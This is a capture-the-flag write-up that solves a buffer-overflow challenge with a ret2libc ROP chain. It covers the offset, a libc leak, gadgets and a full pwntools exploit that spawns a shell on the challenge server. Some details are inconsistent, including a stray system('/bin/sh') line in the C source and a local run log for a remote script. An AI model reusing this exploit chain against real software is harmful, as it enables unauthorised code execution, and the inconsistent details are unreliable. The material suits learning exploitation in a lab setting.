# rop_rop_rop_away

Given an ELF, libc and C source code of the binary. Generally speaking, libc files can determine the addresses of which where the binary is being executed. So they only thing that left is just to determine what is the correct OFFSET in order to exploit the BOF. Then, we can grab the function addresses from the libc file. 

but first, its a good idea to check the file type in order to have a clear visibily of what we are dealing with. 

```bash
file rop_rop_rop_away
rop_rop_rop_away: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0e86dbd76fcb9e38dea86cc8ec5b719140139231, for GNU/Linux 3.2.0, not stripped
```
Its important to know that the file is an 64 bit exectuable, this way we can adapt our final payload in order for our payload to work as expected. Now that we know that we are dealing with a 64 bit binary, its a good idea to check what are the protections that was implemented while compilng this binary.
```bash
checksec rop_rop_rop_away
[*] '/home/osboxes/Desktop/solver/rop_rop_rop_away'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

**NX stands for No eXecute and XD stands for eXecute Disable. Both are same and is a technology used in processors to prevent execution of certain types of code.**  (you can read more about it [here](https://access.redhat.com/solutions/2936741 "here"))



Executing the binary gives the address of fgets function? 

```bash
./rop_rop_rop_away
ROP, ROP, ROP away!
-----------------------
The function fgets() is at 0X7FFFF7E477B0
Enter your character name: AAAAAAAAAAAAAAAAAAAA
Welcome AAAAAAAAAAAAAAAAAAAA to BOF wonderland!
Goodbye!
```

Looking back for the C file in order to get  a better visibilty on what is going on.. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
	printf("ROP, ROP, ROP away!\n");
	printf("-----------------------\n");
	system("/bin/sh")
	//Address of gets
	printf("The function fgets() is at %p\n", fgets);

	//The buffer overflow itself
	char name[32];
	printf("Enter your character name: ");
	gets(name);

	//Print out the name
	printf("Welcome %s to BOF wonderland!\n", name);
	printf("Goodbye!\n");
	return 0;
}
```

from the given code, It is not clear how they were getting the fgets function address, but given the fact that they provided a libc file, I am gonna assume that its being extracted from there. 

From the given code, name can take only 32 buffer, and using fgets to get the user input, it's clear that we can do some evil here. After playing with the binary a littile bit, it seems that 40 is our OFFSET. 

```bash
python -c 'print "A"*40' | ./rop_rop_rop_away
ROP, ROP, ROP away!
-----------------------
The function fgets() is at 0x7ffff7e477b0
Enter your character name: Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA to BOF wonderland!
Goodbye!
ROP, ROP, ROP away!
-----------------------
The function fgets() is at 0x7ffff7e477b0
Enter your character name: Welcome  to BOF wonderland!
Goodbye!
Segmentation fault (core dumped)
```


Based on that, we can create our exploit. 

The fact that we are provided with the fgets address makes things easier, just saying.
Based on that we can calculate the libc base address, and from there everything should work like a charm. To do that, we have to substract the fgets address that is given to us when running the binary with the fgets from libc file. We can easily do that using pwntools.


```python
from pwn import *
import re

libc = ELF("./libc.so.6")
p = remote("pwn.ctf.ae",9999)
#elf = ELF("./rop_rop_rop_away")
#p = elf.process()
x = p.recv()
fgets = re.search("0[xX][0-9a-fA-F]+",x) # Regex to get fgets address
#print(x)
if fgets:
	fgets = int(fgets.group(0),16)
	#print(hex(fgets))
libc.address = fgets - libc.symbols['fgets']
```
Now that we calculated the libc base address, we can any all address within the libc file. And in this case, we want to know where [system](https://pubs.opengroup.org/onlinepubs/009604599/functions/system.html "system") is :). 

```python
system = libc.symbols['system']
```
In order to spawn a shell we need to find where /bin/sh is.

```python
bin_sh = libc.search("/bin/sh").next()
```

To pass /bin/sh into system we will need **pop rdi ; ret** we can get that using a tool called [ROPgadget](https://github.com/JonathanSalwan/ROPgadget "ROPGadget")

```bash
ROPgadget --binary rop_rop_rop_away | grep 'pop rdi ; ret'
0x0000000000401273 : pop rdi ; ret
```

It is also a good idea to get **ret** to avoid breaking our payload. We can also get that using ROPgadget. 

```bash
ROPgadget --binary rop_rop_rop_away | grep 'ret'
0x00000000004010eb : add bh, bh ; loopne 0x40115a ; nop ; ret
0x00000000004011fc : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x00000000004011fd : add byte ptr [rax], al ; add cl, cl ; ret
0x000000000040115a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004011fe : add byte ptr [rax], al ; leave ; ret
0x000000000040115b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401159 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004011ff : add cl, cl ; ret
0x00000000004010ea : add dil, dil ; loopne 0x40115b ; nop ; ret
0x00000000004010e9 : add dil, dil ; loopne 0x40115c ; nop ; ret
0x00000000004010e8 : add dil, dil ; loopne 0x40115d ; nop ; ret
0x000000000040115c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401157 : add eax, 0x2ee3 ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x00000000004010c3 : cli ; ret
0x000000000040128b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x000000000040125c : fisttp word ptr [rax - 0x7d] ; ret
0x0000000000401158 : jrcxz 0x401190 ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401200 : leave ; ret
0x00000000004010ed : loopne 0x401158 ; nop ; ret
0x0000000000401156 : mov byte ptr [rip + 0x2ee3], 1 ; pop rbp ; ret
0x00000000004011fb : mov eax, 0 ; leave ; ret
0x00000000004010ef : nop ; ret
0x000000000040126c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040126e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401270 : pop r14 ; pop r15 ; ret
0x0000000000401272 : pop r15 ; ret
0x000000000040126b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040126f : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040115d : pop rbp ; ret
0x0000000000401273 : pop rdi ; ret
0x0000000000401271 : pop rsi ; pop r15 ; ret
0x000000000040126d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040101a : ret ## This is what we want
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040128d : sub esp, 8 ; add rsp, 8 ; ret
0x000000000040128c : sub rsp, 8 ; add rsp, 8 ; ret
```
Putting all of it together, our exploit should work. Here is the final exploit. 
```python
from pwn import *
import re

libc = ELF("./libc.so.6")
p = remote("pwn.ctf.ae",9999)
#elf = ELF("./rop_rop_rop_away")
#p = elf.process()
x = p.recv()
fgets = re.search("0[xX][0-9a-fA-F]+",x)
#print(x)
if fgets:
	fgets = int(fgets.group(0),16)
	#print(hex(fgets))
libc.address = fgets - libc.symbols['fgets']

system = libc.symbols['system']
bin_sh = libc.search("/bin/sh").next()
pop_rdi = 0x0000000000401273 
ret = 0x000000000040101a
rop_chain = [

	pop_rdi,bin_sh,
	ret,system
	]
print("[+] libc base {}".format(hex(libc.address)))
print("[+] system {}".format(hex(system)))
print("[+] /bin/sh {}".format(hex(bin_sh)))
rop_chain = ''.join([p64(r) for r in rop_chain])
payload = "B" * 40 + rop_chain
print(payload)
p.sendline(payload)
p.interactive()
```

```bash
Executing the python script should provide us an interactive shell.
$ python solve.py 
[*] '/home/osboxes/Desktop/solver/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/osboxes/Desktop/solver/rop_rop_rop_away'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/osboxes/Desktop/solver/rop_rop_rop_away': pid 59235
[+] libc base 0x7ffff7dc2000
[+] system 0x7ffff7e17410
[+] /bin/sh 0x7ffff7f795aa
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBs\x12\x00\x00\x00\x95���\x00\x1a@\x00\x00\x00t���\x7f\x00
[*] Switching to interactive mode
Enter your character name: Welcome BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBs\x12 to BOF wonderland!
Goodbye!
$ 
```
